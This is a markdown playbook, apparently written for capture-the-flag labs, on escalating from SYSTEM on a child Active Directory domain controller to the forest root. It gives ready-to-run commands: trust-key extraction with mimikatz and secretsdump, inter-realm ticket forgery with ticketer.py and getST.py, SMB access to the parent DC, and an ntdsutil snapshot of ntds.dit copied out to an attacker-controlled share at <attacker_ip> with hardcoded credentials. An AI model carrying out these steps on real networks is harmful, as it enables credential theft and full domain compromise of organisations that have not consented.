# Cross-Forest Trust Attack

## When this applies

- AD environment with two domains in a forest trust (parent root + child).
- You have SYSTEM on the CHILD domain DC (typical via MSSQL linked-server `EXEC AT` chain).
- Goal: pivot from child SYSTEM to parent (forest root) DA.

## Technique

The root flag (or highest-value loot) is almost always on the PARENT (forest root) DC's Administrator Desktop, NOT the child DC. Reach forest root from child DC SYSTEM via inter-realm trust key extraction + forged inter-realm TGT.

## Steps

```
# Cross-Forest Trust Attack — SID Filtering Gotchas
# CRITICAL: SIDFilteringQuarantined=False does NOT mean all SID injection works!
# Forest trusts ALWAYS filter well-known SIDs (EA-519, DA-512, SA-518) from other forests
# TREAT_AS_EXTERNAL (0x40) trust attribute: still filters EA/DA/SA RIDs
# The ONLY way to bypass forest trust SID filtering:
#   1. Unconstrained delegation TGT capture (extract actual DC$ TGT, not forged)
#   2. Compromise the trust key + find a path that doesn't need SID injection
#   3. ADCS cross-forest enrollment (if templates allow cross-forest enrollment)
# Golden ticket + SID history across forest trusts = BLOCKED unless BOTH forests are compromised
```

## Cross-Forest Root-Flag Location Signal

When a target environment has **two domains in a forest trust** (parent root + child) and you have SYSTEM on the CHILD domain DC (typical via MSSQL linked-server `EXEC AT` chain), the **root flag (or highest-value loot) is almost always on the PARENT (forest root) DC's Administrator Desktop**, NOT the child DC. The child DC's Administrator Desktop will be empty.

**Signal:** any time the chain reaches SYSTEM on a DC named `PRIMARY`, `CORP-DC`, or anything other than the forest-root DC, but `C:\Users\Administrator\Desktop\` is empty — the flag is on the parent.

**Reaching forest root from child DC SYSTEM:**
- DCSync against the CHILD only retrieves child-domain accounts; parent's `Administrator` and `krbtgt` hashes are NOT in child NTDS.
- Extract the **inter-realm trust key** from child's `LSA secrets` (`mimikatz lsadump::trust /patch` or `secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds NTDS`). Look for `$IDDM_<TRUST_NAME>` and `$G$<TRUST_GUID>` entries.
- Forge an inter-realm TGT using the trust key:
  ```bash
  ticketer.py -nthash <trust_NT> -domain-sid <CHILD_DOMAIN_SID> -domain CHILD.PARENT.LOCAL \
    -extra-sid '<PARENT_ENTERPRISE_ADMINS_SID>' -spn 'krbtgt/PARENT.LOCAL' Administrator
  # The inter-realm TGT presents a referral; from the parent's TGS you can mint
  # service tickets as Administrator@PARENT for any service.
  ```
- Or simpler — `getST.py -spn 'cifs/dc01.parent.local' -impersonate 'Administrator' -dc-ip <PARENT_DC> -hashes :<trust_NT> CHILD.LOCAL/krbtgt`. Then `smbclient -k //dc01.parent.local/C$ -target-ip <PARENT_DC>`.

**The trust key is also the `<PARENT_NETBIOS>$` machine account in CHILD NTDS** — when LSA secrets aren't available (e.g., you only have ntds.dit + SYSTEM hive, no SECURITY hive), grep `<PARENT>$:1NNN:` rows in the secretsdump output. The NT and aes256 keys for `<PARENT>$` are the inter-realm trust keys (corp→ghost direction). Example: `GHOST$:1103:aad3...:9669c150ffd56325badced1cc6547406:::` is the trust key, NOT a workstation account.

**When the CHILD KDC is firewalled off from the attacker** (only the PARENT DC is reachable over VPN), you can still complete the attack by **forging the inter-realm referral TGT directly** instead of asking the child KDC for one. This is what `raiseChild.py` does internally, but it requires reachability to child KDC. Skip child KDC entirely:

```bash
# Step 1 — forge inter-realm referral TGT with the trust key. Note -spn 'krbtgt/PARENT.LOCAL'
ticketer.py -nthash <PARENT$_NT_from_CHILD_NTDS> \
  -domain-sid <CHILD_DOMAIN_SID> -domain child.parent.local \
  -extra-sid '<PARENT_DOMAIN_SID>-519' \
  -spn 'krbtgt/PARENT.LOCAL' Administrator
# Output: Administrator.ccache containing krbtgt/PARENT.LOCAL@CHILD.PARENT.LOCAL

# Step 2 — ask PARENT KDC for a service ticket (referral chains correctly)
KRB5CCNAME=Administrator.ccache getST.py -k -no-pass \
  -dc-ip <PARENT_DC_IP> -spn cifs/dc01.parent.local parent.local/Administrator
# Output: Administrator@cifs_dc01.parent.local@PARENT.LOCAL.ccache

# Step 3 — use service ticket to access parent DC SMB (read root.txt)
KRB5CCNAME=...cifs...ccache smbclient.py -k -no-pass dc01.parent.local
```

Note: pure `ticketer.py -extra-sid` Golden Tickets (Step 1 with -spn krbtgt/CHILD instead) sent directly to PARENT KDC fail with `KDC_ERR_WRONG_REALM`. The `-spn krbtgt/PARENT` form is what the parent KDC expects in a cross-realm referral.

**DNS workaround on macOS without sudo:** Impacket tools resolve hostnames via Python's `socket.getaddrinfo`. Patch it before invoking the tool to override `dc01.parent.local` → IP without touching `/etc/hosts`:

```python
# dnsoverride.py — import as first line of a wrapper, then exec(open(impacket_tool).read())
import socket; _orig = socket.getaddrinfo
OVERRIDES = {'dc01.parent.local': '10.0.0.1', 'parent.local': '10.0.0.1'}
def patched(h, *a, **k): return _orig(OVERRIDES.get(h, h), *a, **k)
socket.getaddrinfo = patched
```

**Don't waste time** chunking 33+ MB ntds.dit through xp_cmdshell `type` calls — it takes ~700 chunks via SQL linked-server which is slow and error-prone. Pull the LSA secrets / trust keys instead (a few KB), OR `ntdsutil "ac i ntds" ifm "create full <path>"` to create a clean snapshot, then SMB-exfil to attacker over `net use \\<attacker_ip>\<share> /user:pwn pwn123` after starting `impacket-smbserver -smb2support -username pwn -password pwn123 SHARE /tmp/exfil`.

## Verifying success

- `smbclient.py -k -no-pass dc01.parent.local` lists C$ contents.
- `cat root.txt` returns the parent DC's flag.

## Common pitfalls

- Direct `ticketer.py -extra-sid` Golden Tickets sent to PARENT KDC fail with `KDC_ERR_WRONG_REALM` — use the `-spn krbtgt/PARENT` referral form instead.
- Forest trust SID filtering blocks injected EA/DA/SA SIDs unless both forests are compromised.
- macOS DNS resolution: monkey-patch `socket.getaddrinfo` in a wrapper if `/etc/hosts` is not writable.

## Tools

- impacket `ticketer.py`, `getST.py`, `secretsdump.py`, `smbclient.py`, `ntdsutil`
- mimikatz (`lsadump::trust /patch`)
